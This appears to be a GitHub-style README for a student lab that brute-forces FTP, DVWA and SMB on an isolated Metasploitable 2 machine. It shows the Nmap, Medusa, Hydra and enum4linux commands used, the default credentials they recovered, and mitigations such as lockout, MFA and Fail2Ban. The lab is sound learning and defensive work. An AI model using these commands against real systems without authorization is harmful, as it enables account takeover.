## 🔗 MITRE ATT&CK

- T1110 - Brute Force
---

# 🔐 Brute Force Lab - Kali Linux + Medusa

![Status](https://img.shields.io/badge/status-completed-success)
![Security](https://img.shields.io/badge/focus-cybersecurity-blue)
![Level](https://img.shields.io/badge/level-intermediate--advanced-orange)
![MITRE](https://img.shields.io/badge/MITRE-T1110-red)
![License](https://img.shields.io/badge/license-educational-lightgrey)

---

## 📌 Description

This project demonstrates brute force attack techniques in a controlled lab environment using Kali Linux and Medusa. The goal is to simulate real-world attack scenarios, identify security weaknesses, and propose effective mitigation strategies.

The lab covers multiple services, including FTP, Web Applications (DVWA), and SMB, providing a practical understanding of offensive security techniques.

---

## 🎯 Objectives

* Understand brute force attacks across different services (FTP, Web, SMB)
* Perform enumeration and credential attacks
* Use tools such as Medusa, Hydra, and Nmap
* Identify vulnerabilities and security gaps
* Apply mitigation strategies aligned with best practices
* Build a professional cybersecurity portfolio

---

## 🧪 Lab Environment

| Component        | Description          |
| ---------------- | -------------------- |
| Attacker Machine | Kali Linux           |
| Target Machine   | Metasploitable 2     |
| Web Application  | DVWA                 |
| Virtualization   | VirtualBox           |
| Network          | Host-Only (Isolated) |

---

## 🌐 Network Architecture

* Kali Linux: `192.168.56.101`
* Metasploitable 2: `192.168.56.102`
* Isolated lab environment (no internet exposure)

---

## 🔍 Enumeration Phase

Service discovery using Nmap:

```bash
nmap -sV 192.168.56.102
```

### Identified Services:

* FTP (21)
* SSH (22)
* HTTP (80)
* SMB (139/445)

---

## 🔓 Attack Scenarios

### 1. FTP Brute Force (Medusa)

```bash
medusa -h 192.168.56.102 -u msfadmin -P wordlists/wordlist.txt -M ftp
```

**Result:**

```
Valid credentials found → msfadmin / msfadmin
```

---

### 2. Web Brute Force (DVWA)

```bash
hydra -l admin -P wordlists/wordlist.txt 192.168.56.102 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
```

**Result:**

```
Valid credentials found → admin / password
```

---

### 3. SMB Password Spraying

```bash
enum4linux 192.168.56.102
medusa -h 192.168.56.102 -U wordlists/users.txt -p password -M smbnt
```

---

## 📊 Results & Key Findings

* Weak/default credentials are still highly exploitable
* Lack of account lockout enables brute force success
* Password spraying is effective and stealthier than traditional brute force
* Enumeration is a critical phase for successful attacks

---

## 🧠 Lessons Learned

* Security failures are often due to **basic misconfigurations**
* Strong password policies alone are not sufficient
* Monitoring and detection are as important as prevention
* Attack automation significantly increases risk exposure
* Even simple wordlists can compromise poorly configured systems

---

## 🛡️ Mitigation Strategies

### 🔐 FTP

* Disable FTP (use SFTP instead)
* Implement Fail2Ban
* Apply rate limiting

### 🌐 Web Applications

* Multi-Factor Authentication (MFA)
* CAPTCHA enforcement
* Account lockout policies
* Secure password hashing (bcrypt)

### 🗂️ SMB

* Enforce strong password policies
* Enable account lockout
* Disable SMBv1
* Continuous log monitoring

---

## 🔗 MITRE ATT&CK Mapping

* **T1110 — Brute Force**

---

## 📁 Project Structure

```
brute-force-lab/
│
├── README.md
├── wordlists/
├── images/
├── scripts/
└── docs/
```

---

## 📸 Evidence

Screenshots and execution logs are available in:

```
/images
```

---

## ⚠️ Disclaimer

This project was developed for educational purposes only in a controlled environment. Unauthorized security testing is illegal.

---

## 💼 About This Project

This lab was designed as part of a cybersecurity learning journey, focusing on offensive security techniques and practical attack simulation.

---

## 👨‍💻 Author

Tharcilia Rollemberg Cybersecurity enthusiast transitioning into offensive security and ethical hacking.

---




